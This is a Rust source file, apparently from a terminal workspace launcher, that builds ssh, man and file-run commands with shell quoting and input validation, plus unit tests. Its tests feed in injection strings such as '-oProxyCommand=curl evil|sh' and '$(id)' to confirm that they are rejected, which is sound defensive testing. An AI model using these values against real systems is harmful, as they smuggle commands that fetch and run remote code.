use std::path::{Path, PathBuf};

use combe_catalog::{HOME_LABEL, Workspace};

pub const HOP_SCHEME: &str = "combe";

pub enum Entry {
    Workspace(PathBuf),
    Hop(PathBuf),
    Run {
        cwd: Option<PathBuf>,
        name: String,
        input: String,
    },
}

pub struct Hop {
    pub workspace: PathBuf,
    pub cwd: PathBuf,
    pub name: String,
}

pub fn file(path: &Path) -> Option<Entry> {
    let resolved = path.canonicalize().ok()?;
    if resolved.is_dir() {
        return Some(Entry::Workspace(resolved));
    }
    let command_path = resolved.to_str()?;
    if command_path.chars().any(|c| c.is_ascii_control()) {
        return None;
    }
    Some(Entry::Run {
        input: quote(command_path),
        name: name_of(&resolved),
        cwd: resolved.parent().map(Path::to_path_buf),
    })
}

pub fn directory(path: &Path) -> Option<Entry> {
    let resolved = path.canonicalize().ok()?;
    resolved.is_dir().then_some(Entry::Hop(resolved))
}

pub fn hop(dir: &Path, rows: &[Workspace], home: Option<&Path>) -> Hop {
    if let Some(row) = rows
        .iter()
        .filter(|row| dir.starts_with(&row.path))
        .max_by_key(|row| row.path.components().count())
    {
        return Hop {
            workspace: row.path.clone(),
            cwd: row.path.clone(),
            name: row.label(),
        };
    }
    let name = if home == Some(dir) {
        HOME_LABEL.to_owned()
    } else {
        name_of(dir)
    };
    Hop {
        workspace: home.unwrap_or(dir).to_path_buf(),
        cwd: dir.to_path_buf(),
        name,
    }
}

pub fn ssh(user: Option<&str>, host: &str, port: Option<u16>) -> Option<Entry> {
    if !is_host(host) {
        return None;
    }
    let mut input = String::from("ssh");
    if let Some(port) = port {
        input.push_str(&format!(" -p {port}"));
    }
    if let Some(user) = user {
        if !is_user(user) {
            return None;
        }
        input.push_str(&format!(" -l {}", quote(user)));
    }
    input.push_str(&format!(" -- {}", quote(host)));
    Some(Entry::Run {
        cwd: None,
        name: host.to_owned(),
        input,
    })
}

pub fn man(section: Option<&str>, page: &str) -> Option<Entry> {
    if !is_page(page) {
        return None;
    }
    let mut input = String::from("man");
    if let Some(section) = section {
        if !is_section(section) {
            return None;
        }
        input.push_str(&format!(" {section}"));
    }
    input.push_str(&format!(" -- {}", quote(page)));
    Some(Entry::Run {
        cwd: None,
        name: page.to_owned(),
        input,
    })
}

pub fn name_of(path: &Path) -> String {
    path.file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("combe")
        .to_owned()
}

fn quote(value: &str) -> String {
    let bare = !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "@%+=:,./-_".contains(c));
    if bare {
        return value.to_owned();
    }
    format!("'{}'", value.replace('\'', r#"'"'"'"#))
}

fn is_host(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 255
        && !host.starts_with('-')
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

fn is_user(user: &str) -> bool {
    !user.is_empty()
        && user.len() <= 64
        && !user.starts_with('-')
        && user
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

fn is_page(page: &str) -> bool {
    !page.is_empty()
        && page.len() <= 128
        && !page.starts_with('-')
        && page
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
}

fn is_section(section: &str) -> bool {
    !section.is_empty() && section.len() <= 4 && section.chars().all(|c| c.is_ascii_alphanumeric())
}

#[cfg(test)]
mod tests {
    use super::*;

    use combe_catalog::WorktreeKind;

    fn input_of(entry: Option<Entry>) -> Option<String> {
        match entry? {
            Entry::Run { input, .. } => Some(input),
            Entry::Workspace(_) | Entry::Hop(_) => None,
        }
    }

    fn worktree(repo: &str, path: &str, branch: &str) -> Workspace {
        Workspace {
            repo_path: PathBuf::from(repo),
            path: PathBuf::from(path),
            kind: WorktreeKind::Git,
            branch: Some(branch.to_owned()),
            head: None,
        }
    }

    fn folder(path: &str) -> Workspace {
        Workspace {
            repo_path: PathBuf::from(path),
            path: PathBuf::from(path),
            kind: WorktreeKind::Folder,
            branch: None,
            head: None,
        }
    }

    fn home() -> PathBuf {
        PathBuf::from("/Users/tester")
    }

    #[test]
    fn ssh_rejects_option_injection() {
        assert!(ssh(None, "-oProxyCommand=curl evil|sh", None).is_none());
        assert!(ssh(Some("-oProxyCommand=x"), "host", None).is_none());
        assert!(ssh(None, "host;curl evil|sh", None).is_none());
        assert!(ssh(None, "$(id)", None).is_none());
        assert!(ssh(None, "", None).is_none());
    }

    #[test]
    fn ssh_separates_options_from_the_host() {
        assert_eq!(
            input_of(ssh(Some("git"), "example.com", Some(2222))).unwrap(),
            "ssh -p 2222 -l git -- example.com"
        );
    }

    #[test]
    fn man_rejects_injection() {
        assert!(man(None, "ls;id").is_none());
        assert!(man(Some("3;id"), "printf").is_none());
        assert!(man(None, "-w").is_none());
    }

    #[test]
    fn quote_neutralizes_shell_metacharacters() {
        assert_eq!(quote("/tmp/plain.command"), "/tmp/plain.command");
        assert_eq!(quote("/tmp/a b;id"), "'/tmp/a b;id'");
        assert_eq!(quote("/tmp/it's"), r#"'/tmp/it'"'"'s'"#);
        assert_eq!(quote("$(id)"), "'$(id)'");
        assert_eq!(quote(""), "''");
    }

    #[test]
    fn file_commands_reject_terminal_controls() {
        let dir = std::env::temp_dir().join(format!("combe-entry-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let plain = dir.join("it's a 文件.command");
        std::fs::write(&plain, "").unwrap();
        assert!(matches!(file(&plain), Some(Entry::Run { .. })));
        assert!(matches!(file(&dir), Some(Entry::Workspace(_))));
        for control in (1u8..=31).chain(std::iter::once(127)) {
            let path = dir.join(format!("a{}.command", char::from(control)));
            std::fs::write(&path, "").unwrap();
            assert!(file(&path).is_none(), "accepted control byte {control}");
        }
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn hop_lands_on_the_worktree_that_owns_the_path() {
        let rows = vec![worktree("/repos/combe", "/repos/combe", "main")];
        let hop = hop(Path::new("/repos/combe"), &rows, Some(&home()));
        assert_eq!(hop.workspace, PathBuf::from("/repos/combe"));
        assert_eq!(hop.cwd, PathBuf::from("/repos/combe"));
        assert_eq!(hop.name, "main");
    }

    #[test]
    fn hop_from_a_subdirectory_opens_the_workspace_root() {
        let rows = vec![worktree("/repos/combe", "/repos/combe", "main")];
        let hop = hop(
            Path::new("/repos/combe/crates/combe/src"),
            &rows,
            Some(&home()),
        );
        assert_eq!(hop.workspace, PathBuf::from("/repos/combe"));
        assert_eq!(hop.cwd, PathBuf::from("/repos/combe"));
    }

    #[test]
    fn hop_prefers_the_longest_ancestor() {
        let rows = vec![
            worktree("/repos/combe", "/repos/combe", "main"),
            worktree("/repos/combe", "/repos/combe/wt/fix", "fix"),
        ];
        let hop = hop(
            Path::new("/repos/combe/wt/fix/crates"),
            &rows,
            Some(&home()),
        );
        assert_eq!(hop.workspace, PathBuf::from("/repos/combe/wt/fix"));
        assert_eq!(hop.name, "fix");
    }

    #[test]
    fn hop_does_not_match_a_sibling_sharing_a_name_prefix() {
        let rows = vec![worktree("/repos/combe", "/repos/combe", "main")];
        let hop = hop(Path::new("/repos/combe-old"), &rows, Some(&home()));
        assert_eq!(hop.workspace, home());
        assert_eq!(hop.cwd, PathBuf::from("/repos/combe-old"));
    }

    #[test]
    fn hop_to_an_unregistered_path_falls_back_to_home_or_the_directory() {
        let hop = hop(Path::new("/Users/tester/git/recall"), &[], Some(&home()));
        assert_eq!(hop.workspace, home());
        assert_eq!(hop.cwd, PathBuf::from("/Users/tester/git/recall"));
        assert_eq!(hop.name, "recall");

        let fallback = super::hop(Path::new("/Users/tester/git/recall"), &[], None);
        assert_eq!(
            fallback.workspace,
            PathBuf::from("/Users/tester/git/recall")
        );
        assert_eq!(fallback.cwd, PathBuf::from("/Users/tester/git/recall"));
        assert_eq!(fallback.name, "recall");
    }

    #[test]
    fn hop_to_home_opens_a_plain_home_tab() {
        let hop = hop(&home(), &[], Some(&home()));
        assert_eq!(hop.workspace, home());
        assert_eq!(hop.cwd, home());
        assert_eq!(hop.name, HOME_LABEL);
    }

    #[test]
    fn hop_lands_on_a_registered_folder_workspace() {
        let rows = vec![folder("/Users/tester/notes")];
        let hop = hop(Path::new("/Users/tester/notes/daily"), &rows, Some(&home()));
        assert_eq!(hop.workspace, PathBuf::from("/Users/tester/notes"));
        assert_eq!(hop.cwd, PathBuf::from("/Users/tester/notes"));
        assert_eq!(hop.name, "notes");
    }

    #[test]
    fn directory_accepts_only_directories() {
        let dir = std::env::temp_dir().join(format!("combe-hop-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("notes.txt");
        std::fs::write(&file, "").unwrap();
        assert!(matches!(directory(&dir), Some(Entry::Hop(_))));
        assert!(directory(&file).is_none());
        assert!(directory(&dir.join("missing")).is_none());
        std::fs::remove_dir_all(dir).unwrap();
    }
}
